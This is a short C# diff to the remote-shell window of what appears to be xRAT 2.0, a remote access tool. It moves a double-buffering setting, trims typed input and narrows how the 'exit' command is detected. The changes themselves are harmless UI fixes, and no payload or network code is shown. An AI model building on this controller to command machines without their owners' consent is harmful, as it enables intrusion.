@@ -23,8 +23,6 @@ namespace xServer.Forms
 
             InitializeComponent();
 
-            this.DoubleBuffered = true;
-
             txtConsoleOutput.AppendText(">> Type 'exit' to close this session" + Environment.NewLine);
         }
 
@@ -41,6 +39,8 @@ namespace xServer.Forms
 
         private void FrmRemoteShell_Load(object sender, EventArgs e)
         {
+            this.DoubleBuffered = true;
+
             if (_connectClient != null)
                 this.Text = string.Format("xRAT 2.0 - Remote Shell [{0}:{1}]",
                     _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
@@ -63,7 +63,7 @@ namespace xServer.Forms
         {
             if (e.KeyCode == Keys.Enter && !string.IsNullOrEmpty(txtConsoleInput.Text.Trim()))
             {
-                string input = txtConsoleInput.Text;
+                string input = txtConsoleInput.Text.TrimStart(' ', ' ').TrimEnd(' ', ' ');
                 txtConsoleInput.Text = string.Empty;
 
                 // Split based on the space key.
@@ -72,9 +72,9 @@ namespace xServer.Forms
                 string[] splitNullInput = input.Split(' ');
 
                 // We have an exit command.
-                if (input == "exit" || input.Trim() == "exit" ||
-                    ((splitSpaceInput.Length > 0) && splitSpaceInput.Contains("exit")) ||
-                    ((splitNullInput.Length > 0) && splitNullInput.Contains("exit")))
+                if (input == "exit" ||
+                    ((splitSpaceInput.Length > 0) && splitSpaceInput[0] == "exit") ||
+                    ((splitNullInput.Length > 0) && splitNullInput[0] == "exit"))
                 {
                     this.Close();
                 }
